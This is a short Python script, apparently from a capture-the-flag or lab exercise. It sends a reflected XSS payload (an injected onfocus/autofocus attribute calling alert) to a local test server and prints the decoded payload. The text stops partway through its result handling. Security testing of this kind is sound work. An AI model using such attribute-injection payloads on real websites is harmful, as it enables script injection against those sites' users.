import urllib.request
import urllib.parse
import re
import html

def make_request(url):
    """Make HTTP request using urllib"""
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=10) as response:
            content = response.read().decode('utf-8', errors='ignore')
            status = response.status
            headers = dict(response.headers)
            return content, status, headers
    except urllib.error.HTTPError as e:
        return e.read().decode('utf-8', errors='ignore'), e.code, dict(e.headers)
    except urllib.error.URLError as e:
        print(f"[!] URL Error: {e}")
        return None, None, None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return None, None, None

# Target URL with XSS payload
url = "http://127.0.0.1:32811/page?name=test%22%20onfocus=%22alert('XSS')%22%20autofocus=%22"

print(f"[*] Sending GET request to: {url}")
print(f"[*] Decoded payload: test\" onfocus=\"alert('XSS')\" autofocus=\"")

content, status_code, headers = make_request(url)

if content is None:
    print(f"[-] Request failed - cannot reach target")
else:
